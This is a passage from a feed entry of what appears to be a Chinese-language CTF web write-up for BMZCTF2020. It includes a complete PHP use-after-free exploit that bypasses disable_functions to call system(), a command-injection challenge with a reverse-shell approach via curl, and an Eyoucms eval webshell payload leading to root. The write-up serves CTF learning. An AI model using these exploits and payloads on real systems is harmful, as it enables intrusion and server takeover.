class="keyword">function</span> <span class="title">s2i</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    $result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ($x = <span class="number">0</span>;$x &lt; strlen($s);$x++) &#123;</span><br><span class="line">        $result &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        $result |= ord($s[$x]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">&amp;$a, $address</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $s;</span><br><span class="line">    i2s($a, <span class="number">0x00</span>, $address - <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> strlen($s -&gt; current());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPHPChunk</span>(<span class="params">$maps</span>) </span>&#123;</span><br><span class="line">    $pattern = <span class="string">&#x27;/([0-9a-f]+\-[0-9a-f]+) rw\-p 00000000 00:00 0 /&#x27;</span>;</span><br><span class="line">    preg_match_all($pattern, $maps, $match);</span><br><span class="line">    <span class="keyword">foreach</span> ($match[<span class="number">1</span>] <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        <span class="keyword">list</span>($start, $end) = explode(<span class="string">&quot;-&quot;</span>, $value);</span><br><span class="line">        <span class="keyword">if</span> (($length = s2i(hex2bin($end)) - s2i(hex2bin($start))) &gt;= <span class="number">0x200000</span> &amp;&amp; $length &lt;= <span class="number">0x300000</span>) &#123;</span><br><span class="line">            $address = <span class="keyword">array</span>(s2i(hex2bin($start)), s2i(hex2bin($end)), $length);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;[+]PHP Chunk: &quot;</span> . $start . <span class="string">&quot; - &quot;</span> . $end . <span class="string">&quot;, length: 0x&quot;</span> . dechex($length) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> $address;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bomb1</span>(<span class="params">&amp;$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (leak($a, s2i($_GET[<span class="string">&quot;test1&quot;</span>])) === <span class="number">0x5454545454545454</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (s2i($_GET[<span class="string">&quot;test1&quot;</span>]) &amp; <span class="number">0x7ffff0000000</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Where is here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bomb2</span>(<span class="params">&amp;$a</span>) </span>&#123;</span><br><span class="line">    $start = s2i($_GET[<span class="string">&quot;test2&quot;</span>]);</span><br><span class="line">    <span class="keyword">return</span> getElement($a, <span class="keyword">array</span>($start, $start + <span class="number">0x200000</span>, <span class="number">0x200000</span>));</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;[!]Not Found&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getElement</span>(<span class="params">&amp;$a, $address</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> ($x = <span class="number">0</span>;$x &lt; ($address[<span class="number">2</span>] / <span class="number">0x1000</span> - <span class="number">2</span>);$x++) &#123;</span><br><span class="line">        $addr = <span class="number">0x108</span> + $address[<span class="number">0</span>] + <span class="number">0x1000</span> * $x + <span class="number">0x1000</span>;</span><br><span class="line">        <span class="keyword">for</span> ($y = <span class="number">0</span>;$y &lt; <span class="number">5</span>;$y++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (leak($a, $addr + $y * <span class="number">0x08</span>) === <span class="number">0x1234567812345678</span> &amp;&amp; ((leak($a, $addr + $y * <span class="number">0x08</span> - <span class="number">0x08</span>) &amp; <span class="number">0xffffffff</span>) === <span class="number">0x01</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;[+]SplDoublyLinkedList Element: &quot;</span> . dechex($addr + $y * <span class="number">0x08</span> - <span class="number">0x18</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> $addr + $y * <span class="number">0x08</span> - <span class="number">0x18</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getClosureChunk</span>(<span class="params">&amp;$a, $address</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        $address = leak($a, $address);</span><br><span class="line">    &#125;<span class="keyword">while</span>(leak($a, $address) !== <span class="number">0x00</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Closure Chunk: &quot;</span> . dechex($address) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> $address;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSystem</span>(<span class="params">&amp;$a, $address</span>) </span>&#123;</span><br><span class="line">    $start = $address &amp; <span class="number">0xffffffffffff0000</span>;</span><br><span class="line">    $lowestAddr = ($address &amp; <span class="number">0x0000fffffff00000</span>) - <span class="number">0x0000000001000000</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span> * <span class="number">0x80</span>; $i++) &#123;</span><br><span class="line">        $addr = $start - $i * <span class="number">0x20</span>;</span><br><span class="line">        <span class="keyword">if</span> ($addr &lt; $lowestAddr) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $nameAddr = leak($a, $addr);</span><br><span class="line">        <span class="keyword">if</span> ($nameAddr &gt; $address || $nameAddr &lt; $lowestAddr) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $name = dechex(leak($a, $nameAddr));</span><br><span class="line">        $name = str_pad($name, <span class="number">16</span>, <span class="string">&quot;0&quot;</span>, STR_PAD_LEFT);</span><br><span class="line">        $name = strrev(hex2bin($name));</span><br><span class="line">        $name = explode(<span class="string">&quot;\x00&quot;</span>, $name)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>($name === <span class="string">&quot;system&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> leak($a, $addr + <span class="number">0x08</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Trigger</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $s;</span><br><span class="line">        <span class="keyword">unset</span>($s[<span class="number">0</span>]);</span><br><span class="line">        $a = str_shuffle(str_repeat(<span class="string">&quot;T&quot;</span>, <span class="number">0xf</span>));</span><br><span class="line">        i2s($a, <span class="number">0x00</span>, <span class="number">0x1234567812345678</span>);</span><br><span class="line">        i2s($a, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">7</span>);</span><br><span class="line">        $s -&gt; current();</span><br><span class="line">        $s -&gt; next();</span><br><span class="line">        <span class="keyword">if</span> ($s -&gt; current() !== <span class="number">0x1234567812345678</span>) &#123;</span><br><span class="line">             <span class="keyword">die</span>(<span class="string">&quot;[!]UAF Failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $maps = file_get_contents(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!$maps) &#123;</span><br><span class="line">            cantRead($a);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            canRead($maps, $a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[+]Done&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bypass</span>(<span class="params">$elementAddress, &amp;$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $s;</span><br><span class="line">    <span class="keyword">if</span> (!$closureChunkAddress = getClosureChunk($a, $elementAddress)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get Closure Chunk Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $closure_object = leak($a, $closureChunkAddress + <span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Closure Object: &quot;</span> . dechex($closure_object) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    $closure_handlers = leak($a, $closure_object + <span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Closure Handler: &quot;</span> . dechex($closure_handlers) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!($system_address = getSystem($a, $closure_handlers))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Couldn&#x27;t determine system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Find system&#x27;s handler: &quot;</span> . dechex($system_address) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    i2s($a, <span class="number">0x08</span>, <span class="number">0x506</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; (<span class="number">0x130</span> / <span class="number">0x08</span>);$i++) &#123;</span><br><span class="line">        $data = leak($a, $closure_object + <span class="number">0x08</span> * $i);</span><br><span class="line">        i2s($a, <span class="number">0x00</span>, $closure_object + <span class="number">0x30</span>);</span><br><span class="line">        i2s($s -&gt; current(), <span class="number">0x08</span> * $i + <span class="number">0x100</span>, $data);</span><br><span class="line">    &#125;</span><br><span class="line">    i2s($a, <span class="number">0x00</span>, $closure_object + <span class="number">0x30</span>);</span><br><span class="line">    i2s($s -&gt; current(), <span class="number">0x20</span>, $system_address);</span><br><span class="line">    i2s($a, <span class="number">0x00</span>, $closure_object);</span><br><span class="line">    i2s($a, <span class="number">0x08</span>, <span class="number">0x108</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Executing command: \n&quot;</span>;</span><br><span class="line">    ($s -&gt; current())(<span class="string">&quot;/readflag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">canRead</span>(<span class="params">$maps, &amp;$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $s;</span><br><span class="line">    <span class="keyword">if</span> (!$chunkAddress = getPHPChunk($maps)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get PHP Chunk Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    i2s($a, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$elementAddress = getElement($a, $chunkAddress)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    bypass($elementAddress, $a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cantRead</span>(<span class="params">&amp;$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $s;</span><br><span class="line">    i2s($a, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&quot;test1&quot;</span>]) &amp;&amp; !<span class="keyword">isset</span>($_GET[<span class="string">&quot;test2&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Please try to get address of PHP Chunk&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;test1&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(dechex(bomb1($a)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;test2&quot;</span>])) &#123;</span><br><span class="line">        $elementAddress = bomb2($a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$elementAddress) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    bypass($elementAddress, $a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="keyword">new</span> <span class="built_in">SplDoublyLinkedList</span>();</span><br><span class="line">$s -&gt; push(<span class="keyword">new</span> Trigger());</span><br><span class="line">$s -&gt; push(<span class="string">&quot;Twings&quot;</span>);</span><br><span class="line">$s -&gt; push(<span class="function"><span class="keyword">function</span>(<span class="params">$x</span>)</span>&#123;&#125;);</span><br><span class="line"><span class="keyword">for</span> ($x = <span class="number">0</span>;$x &lt; <span class="number">0x100</span>;$x++) &#123;</span><br><span class="line">    $s -&gt; push(<span class="number">0x1234567812345678</span>);</span><br><span class="line">&#125;</span><br><span class="line">$s -&gt; rewind();</span><br><span class="line"><span class="keyword">unset</span>($s[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>先用蚁剑连接：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201230191719.png" alt=""></p><p>再上传至/tmp目录下：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201230191807.png" alt=""></p><p>include包含exp.php</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201230191837.png" alt=""></p><h2 id="0x03-penetration">0x03 penetration</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">    $ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    $_=<span class="keyword">array</span>(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\:&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\@&#x27;</span>,<span class="string">&#x27;\&amp;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\%&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\)&#x27;</span>,<span class="string">&#x27;\!&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&#125;&#x27;</span>,<span class="string">&#x27;\&#123;&#x27;</span>,<span class="string">&#x27;\_&#x27;</span>);</span><br><span class="line">    $blacklist = array_merge($_);</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen($ip) &lt;= <span class="number">18</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blacklisted . <span class="string">&#x27;/im&#x27;</span>, $ip)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            exec($ip);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;long&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤之后还剩下这些字符可以使用:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># $ , &#x2F; ; ? \ &#96; | a c h l r s t u v y z 0 1 2 3 4 5 6 7 8 9</span><br></pre></td></tr></table></figure><p>由于exec没有回显，应该要使用反弹shell，但是有字数长度限制，这里需要用curl命令读取远程文件绕过一下，而且要把ip地址转换成十进制表示，不知道是我的阿里云站点配置有问题还是怎么回事，我用curl命令+ip地址返回200，但是curl+十进制ip地址就直接给我返回301了，但是我看了宝塔的配置，也没有启用301重定向。</p><p>有知道原因的时候师傅可以告知我一下。</p><h2 id="0x04-BMZ-Market">0x04 BMZ_Market</h2><p>综合渗透类型，有点像HackTheBox。</p><p>首先进行信息搜集，查看源代码：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131109.png" alt=""></p><p>robots.txt</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131154.png" alt=""></p><p>一共搜集到两个地方，参数lang和robots.txt</p><p>参数lang存在文件包含漏洞，使用伪协议可以读取源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password =<span class="string">&quot;Nevergiveup135.&quot;</span> ;<span class="comment">//I have to remember it</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;lang&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">&#x27;lang&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;description&quot;</span> content=<span class="string">&quot;BMZ Market&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;author&quot;</span> content=<span class="string">&quot;bmz&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;BMZ Market&lt;/title&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;link href=<span class="string">&quot;bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    &lt;link href=<span class="string">&quot;covers.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body class=&quot;text-center&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&gt;</span><br><span class="line">      &lt;header class=&quot;masthead mb-auto&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">          &lt;h3 class=&quot;masthead-brand&quot;&gt;BMZ Market&lt;/h3&gt;</span><br><span class="line">          &lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&gt;</span><br><span class="line">            &lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&gt;Home&lt;/a&gt;</span><br><span class="line">            &lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;</span><br><span class="line">          &lt;/nav&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/header&gt;</span><br><span class="line"></span><br><span class="line">      &lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&gt;</span><br><span class="line">        &lt;h1 class=&quot;cover-heading&quot;&gt;Coming soon&lt;/h1&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">          <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;lang&#x27;</span>]))</span><br><span class="line">          &#123;</span><br><span class="line">          <span class="keyword">echo</span> $message;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">            Believe in yourself, you can find the flag</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">          &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">          &lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&gt;more&lt;/a&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">      &lt;/main&gt;</span><br><span class="line"></span><br><span class="line">      &lt;footer class=&quot;mastfoot mt-auto&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">          &lt;p&gt;Power by&lt;a href=<span class="string">&quot;#&quot;</span>&gt;@kuaile&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/footer&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>有一个密码硬编码的地方：<code>Nevergiveup135.</code>，用户名可能是kuaile</p><p>robots.txt拿去base64 decode：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131506.png" alt=""></p><p>发现是颜文字，可以直接拿到浏览器的console界面执行</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131609.png" alt=""></p><p>又给了一个信息：<code>Challenger, the background of the website is -.../--/--../.-/-../--/../-.</code></p><p>后面是一个摩斯编码，解码后的结果是:<code>BMZADMIN</code>，看样子应该是一个后台管理界面，用上面得到的用户名和密码登录进入后台。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131827.png" alt=""></p><p>可以看到当前的CMS版本是1.3.7，Google已知的利用方式：<a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Eyoucms/Eyoucms%201.3.9%20%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">https://wiki.96.mk/Web安全/Eyoucms/Eyoucms 1.3.9 上传漏洞/</a></p><p>这种利用方式好像打不通，参考mochu师傅的wp</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103154407.png" alt=""></p><p>抓包修改参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;scene&#x3D;bbb\&#39;,$&#123;eval($_POST[mochu7])&#125;,&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103154643.png" alt=""></p><p>蚁剑连接，sudo -l发现可以无限制执行root命令：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103155216.png" alt=""></p><p>再回头来看看后台上传文件RCE失效的原因：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103155327.png" alt=""></p><p>可能是作者把解压的类文件给删掉了。</p><p>来大概跟一下这个漏洞，文件位置在application/admin/controllor/Weapp.php</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103165020.png" alt=""></p><p>由于过滤不严，直接把payload写到config.php文件当中：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103164941.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103165136.png" alt=""></p><p>然后在core/library/think/App.php中包含了config.php</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103170458.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BMZCTF2020-Web-WriteUp&quot;&gt;BMZCTF2020 Web WriteUp&lt;/h1&gt;
&lt;h2 id=&quot;0x01-easyeval&quot;&gt;0x01 easyeval&lt;/h2&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Python沙箱逃逸</title>
    <link href="http://ca0y1h.top/Python/pysec/2.Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <id>http://ca0y1h.top/Python/pysec/2.Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</id>
    <published>2021-01-03T02:53:44.000Z</published>
    <updated>2021-01-03T02:54:29.541Z</updated>
    
